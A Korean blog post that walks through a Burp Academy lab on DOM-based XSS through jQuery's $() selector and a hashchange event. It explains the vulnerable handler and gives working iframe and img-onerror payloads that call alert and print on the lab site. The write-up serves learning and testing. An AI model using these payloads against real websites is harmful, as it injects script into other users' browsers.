---
layout: post
title: "Burp Academy-XSS 취약점: DOM XSS in jQuery selector sink using a hashchange event"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, XSS취약점]
toc: true
last_modified_at: 2025-06-12 21:55:00 +0900
---

# 개요
- Dom기반 XSS 취약점 랩이다.
- 문제 주소: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
- 취약점 설명: https://portswigger.net/web-security/cross-site-scripting/dom-based
- 난이도: APPRENTICE (쉬움)

# 취약점 설명 (DOM XSS in jQuery)

주의해야 할 또 다른 잠재적인 싱크(sink)는 jQuery의 `$()` 셀렉터 함수인데, 이 함수는 악성 객체를 DOM에 주입하는 데 사용될 수 있다. 

jQuery는 한때 매우 인기가 많았는데, 이 셀렉터를 `location.hash` 애니메이션 소스와 함께 사용하거나 페이지의 특정 엘레먼트로 자동 스크롤하는 웹사이트에서 고전적인 DOM XSS 취약점이 발생했다. 이러한 동작은 다음과 유사한 취약한 `hashchange` 이벤트 핸들러를 사용하여 구현되는 경우가 많았다.

```js
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

`hash`가 사용자가 제어할 수 있는 값이므로 공격자는 이를 이용하여 `$()`셀렉터 싱크에 XSS 벡터를 삽입할 수 있다. 최신 버전의 jQuery는 입력값이 해시 문자(`#`)로 시작하는 경우 셀렉터에 HTML을 삽입하지 못하도록 하여 이 취약점을 패치했다. 하지만 여전히 취약한 코드가 발견될 수 있다.

이 고전적인 취약점을 실제로 악용하려면 사용자 상호작용 없이 `hashchange` 이벤트를 트리거하는 방법을 찾아야 한다. 가장 간단한 방법 중 하나는 다음과 같이 `iframe`을 이용하여 exploit을 배포하는 것이다. 

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

이 예에서 `src`속성은 해시 값이 비어 있는 취약한 페이지를 가리킨다. `iframe`이 로드되면 XSS 벡터가 해시에 추가되어 `hashchange` 이벤트가 발생한다. 


# 랩 설명
- 이 랩은 홈 페이지에 DOM 기반 크로스 사이트 스크립팅 취약점을 포함하고 있다.
-  jQuery의 `$()` 셀렉터 함수를 사용하여 특정 게시물로 자동 스크롤하고, 게시물의 제목은 `location.hash` 속성을 통해 전달된다. 
- 이 랩을 풀려면 victim의 브라우저에서 `print()`함수를 호출하는 exploit을 전달하라. 

```
This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.
```

# 풀이
1. 일단 취약점이 있는 곳을 찾는다. 랩 서버에 접속한 후 홈 페이지(/)의 소스 코드를 보면 다음과 같은 Javascript 코드가 있는 것을 발견할 수 있다. 이는 URL의 해시의 값을 포함하는 포스트 제목(h2)으로 스크롤을 이동시켜주는 기능이다. 

```js
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

예를 들면 다음과 같이 URL에 `#Made` 해시를 추가하면, 해시의 값이 타이틀에 포함되어 있는 부분으로 웹 페이지가 스크롤된다. 

![](/images/burp-academy-xss-6-1.png)

한편, 해시 값과 일치하는 포스트가 없는 경우(예를들면, `#1234`등) 는 다음과 같이 Javascript 에러가 발생한다. 

![](/images/burp-academy-xss-6-2.png)

2. 이어서 jQuery의 버전도 확인해본다. 브라우저의 개발자 도구의 콘솔에서 `$().jquery`를 실행해보면 '1.8.2'가 출력된다. 이 버전은 취약점 설명에 있는 것처럼 셀렉터로의 입력값이 해시 문자(`#`)로 시작하는 경우 셀렉터에 HTML을 삽입하지 못하도록 한 버전이다. 이는 콘솔에서 `$('#<img src=1 onerror=alert(1)>')`를 실행해보면 알 수 있다. 실제로 실행해보면 다음과 같이 에러가 발생하고, 실행이 막혀있다. 완전히 취약한 옛날버전이 아닌, 어느정도 보안 패치가 된 버전이다. 참고로, 버전 '1.8.2'는 2012년 9월20일에 릴리즈 되었다. 그리고 2025년 6월 시점의 최신버전은 '3.7.1'이다. 

```
jquery_1-8-2.js:2 Uncaught Error: JQMIGRATE: Invalid selector string (XSS)
    at p.error (jquery_1-8-2.js:2:13149)
    at new a.fn.init (jqueryMigrate_1-4-1.js:2:2950)
    at p (jquery_1-8-2.js:2:9336)
    at <anonymous>:1:1
```

3. 랩의 Javascript코드를 다시 한번 살펴본다. 유저가 제어가능한 값인 해시가 jQuery 셀렉터의 입력으로 들어가고 있으므로 Dom기반의 XSS가 가능할 것이다. 그리고 window.location.hash에서 slice(1)로 `#`부분을 제거한 값이 셀렉터에 전달되므로 jQuery 1.8.2에 있는 보안기능은 효과가 없을 것이다. 

```js
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

4. exploit을 생각해본다. 랩 서버는 `hashchange`이벤트에 반응하므로 이 이벤트를 발생시키는 exploit이 필요하다. iframe의 src에 랩의 URL을 지정하고, 마지막에 해시(`#`)를 추가해준다. onload에 페이로드를 지정해준다. 다음과 같다. 

```html
<iframe src="https://0aee002b036b7cf6817e5cb3003b0067.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print(1)>'">
```

5. 이 iframe이 로드되면, onload 이벤트에 의해 URL에 해시가 추가될 것이다. 해시가 추가됨에 따라서, 랩 사이트의 `hashchange`이벤트가 발생되고, 이벤트 핸들러의 코드(웹 페이지를 스크롤링 하는 코드)가 실행된다. 그리고 `$` 셀렉터는 페이로드 `<img src=1 onerror=print(1)>`를 평가(evaluate)한다. 그 결과 img 엘레먼트의 src속성에서 에러가 발생하기 때문에 onerror이벤트 핸들러가 발동하여 `print(1)`함수가 실행된다. 

6. exploit서버에서 위의 exploit을 세팅하고 "Deliver to victim"버튼을 누르면 랩이 풀린다. 

![](/images/burp-academy-xss-6-success.png)